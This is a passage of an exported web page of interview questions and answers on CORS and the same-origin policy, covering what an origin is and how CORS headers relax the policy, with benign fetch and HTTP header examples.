<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CORS and Same-Origin Policy Interview Questions &amp; Answers</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

/* Override strong tags inside headings to maintain consistent weight */
h1 strong,
h2 strong,
h3 strong {
	font-weight: 600;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 10px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.collection-content td {
	white-space: pre-wrap;
	word-break: break-word;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.callout img.notion-static-icon {
	width: 1em;
	height: 1em;
}

.callout p {
	margin: 0;
}

.callout h1,
.callout h2,
.callout h3 {
	margin: 0 0 0.6rem;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

blockquote.quote-large {
	font-size: 1.25em;
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.highlight-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.highlight-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.highlight-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.highlight-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.highlight-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.highlight-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.highlight-default_background {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray_background {
	background: rgba(42, 28, 0, 0.07);
}
.highlight-brown_background {
	background: rgba(139, 46, 0, 0.086);
}
.highlight-orange_background {
	background: rgba(224, 101, 1, 0.129);
}
.highlight-yellow_background {
	background: rgba(211, 168, 0, 0.137);
}
.highlight-teal_background {
	background: rgba(0, 100, 45, 0.09);
}
.highlight-blue_background {
	background: rgba(0, 124, 215, 0.094);
}
.highlight-purple_background {
	background: rgba(102, 0, 178, 0.078);
}
.highlight-pink_background {
	background: rgba(197, 0, 93, 0.086);
}
.highlight-red_background {
	background: rgba(223, 22, 0, 0.094);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.block-color-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.block-color-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.block-color-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.block-color-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.block-color-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.block-color-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(240, 239, 237, 1);
}
.block-color-brown_background {
	background: rgba(245, 237, 233, 1);
}
.block-color-orange_background {
	background: rgba(251, 235, 222, 1);
}
.block-color-yellow_background {
	background: rgba(249, 243, 220, 1);
}
.block-color-teal_background {
	background: rgba(232, 241, 236, 1);
}
.block-color-blue_background {
	background: rgba(229, 242, 252, 1);
}
.block-color-purple_background {
	background: rgba(243, 235, 249, 1);
}
.block-color-pink_background {
	background: rgba(250, 233, 241, 1);
}
.block-color-red_background {
	background: rgba(252, 233, 231, 1);
}
.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2b4562ad-76f0-8091-89a0-c8f99a19ba99" class="page mono"><header><h1 class="page-title" dir="auto"><strong>CORS and Same-Origin Policy Interview Questions &amp; Answers</strong></h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2b4562ad-76f0-80ed-8c32-d8c7a72a5559" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-8061-9d5e-f5f7f6fc0292">Fundamental Questions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8050-97f8-dd149e6275b7">Q1: What is the Same-Origin Policy (SOP) and why does it exist?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8043-b457-f42917fec151">Q2: What is CORS and how does it relate to SOP?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8074-9736-d260d82076be">Q3: What are the components that define an origin?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80da-9eea-eb13718385f9">Q4: What is the difference between simple requests and preflight requests?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-807e-a0d4-f4b765c086ab">Q5: What are the main CORS headers and what do they do?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80bf-ac1d-e059585fe834">Scenario-Based Questions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80d0-917b-ca165a56b795">Q6: How would you configure CORS to allow a trusted third-party domain to access your API while ensuring security?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-805d-b0e1-e1da1ead03b8">Q7: A user reports that their application can’t make requests to your API. How do you troubleshoot CORS issues?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80bf-847e-e38fae8eaea4">Q8: Your API needs to support both web and mobile apps. How do you configure CORS?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-806d-a54e-e0a74dfb4633">Q9: You discover that your CORS configuration allows any origin. What are the security implications?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8028-8468-f54fe845810c">Q10: How do you handle CORS for a development environment vs production?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-806e-a96e-ea7fc0a8a1a8">Implementation Questions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80d9-9607-ee872d133c1d">Q11: How do you implement CORS in Node.js/Express?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8026-9e29-f0e3081be38a">Q12: How do you test CORS configuration?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-807b-9e90-c311f0e5317b">Security &amp; Vulnerability Questions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80f1-a92f-ea1df5d99176">Q13: What is a CORS vulnerability and how can it be exploited?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c6-b608-f9e99e1a3a90">Q14: How do you prevent CORS vulnerabilities?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-803d-a306-e885a9f6766b">Q15: Does CORS protect against CSRF attacks?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-806f-91fe-d5e6ae3d1382">Advanced Questions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80a8-b395-f1cca73e97c0">Q16: Explain the preflight request flow in detail.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-801d-b5a5-f7905ba299b4">Q17: What happens if you don’t handle preflight requests properly?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8064-b25d-cc8294dc7620">Q18: How does CORS work with credentials (cookies, authentication)?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-806e-8257-e03ea4d1e8b0">Q19: What is the difference between CORS and JSONP?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-802d-9e31-cbe7317b0063">Q20: How do you implement CORS for multiple environments (dev, staging, production)?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-8069-991f-dca224697f24">Quick Reference Answers</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8053-802e-f5f58f824083">What is SOP?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-808e-958e-e745497d377f">What is CORS?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8002-a5fc-e5b6d46c6522">Does CORS protect your server?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c5-ac9d-f5a9a07dabb1">Can you use wildcard with credentials?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80a0-8a7e-de76a65fcdc3">What triggers a preflight request?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-809b-96ed-ee511ae377fc">Summary</a></div></nav></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8086-ac77-d837d371477c"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8061-9d5e-f5f7f6fc0292" class="">Fundamental Questions</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8050-97f8-dd149e6275b7" class="">Q1: What is the Same-Origin Policy (SOP) and why does it exist?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b0-bda2-c5fd6113f28b" class=""><strong>Answer:</strong><br/>The Same-Origin Policy is a <strong>browser security mechanism</strong> that restricts how documents or scripts loaded from one origin can interact with resources from another origin.</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8035-ad29-d890e34723b7" class=""><strong>An origin is defined by:</strong><br/>- <strong>Scheme (Protocol)</strong>: <code>http://</code> or <code>https://</code><br/>- <strong>Host (Domain)</strong>: <code>example.com</code><br/>- <strong>Port</strong>: <code>80</code> (HTTP) or <code>443</code> (HTTPS) - default ports are implicit</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f4-9014-d8ea09eebadb" class=""><strong>Why it exists:</strong><br/>1. <strong>Prevents XSS attacks</strong> - Malicious scripts cannot access data from other origins<br/>2. <strong>Prevents cookie theft</strong> - Cookies are origin-specific<br/>3. <strong>Protects user privacy</strong> - Prevents unauthorized data access<br/>4. <strong>Security isolation</strong> - Websites cannot interfere with each other</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-803f-ba19-ec8955942502" class=""><strong>What it restricts:</strong><br/>- JavaScript access to DOM from different origins<br/>- AJAX/Fetch requests to different origins<br/>- Cookie access from different origins<br/>- LocalStorage/SessionStorage access from different origins</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f1-944f-fb8bf87db4c2" class=""><strong>What it does NOT restrict:</strong><br/>- Embedding resources (images, scripts, stylesheets, iframes)<br/>- Form submissions to different origins<br/>- Redirects to different origins</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8043-8270-d347b63788cb" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80b2-b7c6-edc614719a95" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Same origin - ALLOWED// https://example.com/page1 accessing https://example.com/page2fetch(&#x27;https://example.com/api/data&#x27;)
  .then(response =&gt; response.json());  // Works// Different origin - BLOCKED// https://example.com accessing https://api.example.comfetch(&#x27;https://api.example.com/data&#x27;)
  .then(response =&gt; response.json());  // CORS error</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8025-ac79-d476eb73179e"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8043-b457-f42917fec151" class="">Q2: What is CORS and how does it relate to SOP?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80bd-91a8-c6ce09c2152d" class=""><strong>Answer:</strong><br/>CORS (Cross-Origin Resource Sharing) is a mechanism that allows web servers to specify which origins are permitted to access their resources, thereby <strong>relaxing the Same-Origin Policy</strong> in a controlled manner.</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e4-a9be-f5ffb1a217d0" class=""><strong>Key relationship:</strong><br/>- <strong>SOP</strong> = Default security mechanism (restricts cross-origin access)<br/>- <strong>CORS</strong> = Controlled relaxation (allows specific origins)</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-804d-9540-d5d6b6f080a9" class=""><strong>How CORS works:</strong><br/>1. Browser sends request with <code>Origin</code> header<br/>2. Server responds with CORS headers (e.g., <code>Access-Control-Allow-Origin</code>)<br/>3. Browser checks CORS headers<br/>4. If origin is allowed → Request proceeds<br/>5. If origin is not allowed → Request blocked</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80af-bba1-c601bbda16f3" class=""><strong>Important:</strong><br/>- CORS is <strong>browser-enforced</strong>, not server-protected<br/>- Direct requests (curl, Postman) <strong>bypass CORS</strong><br/>- CORS only affects browser-based requests</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c7-867a-e08964712ac1" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-804a-bf52-e37a442337a5" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Request
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Content-Type: application/json

{&quot;data&quot;: &quot;value&quot;}</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80b2-9178-ff536df55037"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8074-9736-d260d82076be" class="">Q3: What are the components that define an origin?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cc-bee4-ebff97f094ca" class=""><strong>Answer:</strong><br/>An origin is defined by <strong>three components</strong>:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8081-b6f7-d8a24aed4189" class="numbered-list" start="1"><li><strong>Scheme (Protocol)</strong>: <code>http://</code> or <code>https://</code></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8062-a6e9-c73cc68605d3" class="numbered-list" start="2"><li><strong>Host (Domain)</strong>: <code>example.com</code></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-803d-b450-f433d52a6605" class="numbered-list" start="3"><li><strong>Port</strong>: <code>80</code> (HTTP) or <code>443</code> (HTTPS) - default ports are implicit</li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-808b-9029-e5ec9bc44373" class=""><strong>Same Origin Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" 